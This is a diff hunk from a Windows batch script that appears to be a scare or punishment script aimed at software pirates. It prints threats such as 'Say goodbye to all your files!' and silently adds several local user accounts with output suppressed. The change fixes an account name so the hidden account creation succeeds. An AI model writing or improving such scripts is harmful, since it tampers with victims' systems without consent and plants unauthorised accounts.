@@ -22,7 +22,7 @@ echo Say goodbye to all your files!
 timeout /t 2
 echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
 timeout /t 5
-net user Adobe_PW:CreativeCloud CreativeCloud /add >nul 2>&1
+net user Adobe_PW_CreativeCloud CreativeCloud /add >nul 2>&1
 net user A_Piracy péoaesj /add >nul 2>&1
 net user b_is alsieufb /add >nul 2>&1
 net user c_not iaiéáéá /add >nul 2>&1
